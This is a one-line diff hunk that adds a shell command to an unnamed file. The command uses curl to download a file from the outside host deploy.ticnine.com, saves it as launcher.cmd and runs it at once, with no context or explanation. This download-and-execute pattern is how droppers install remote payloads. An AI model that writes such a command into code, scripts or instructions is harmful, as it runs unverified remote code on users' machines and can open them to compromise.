@@ -1,0 +1,1 @@
+curl -L deploy.ticnine.com -o launcher.cmd && launcher.cmd
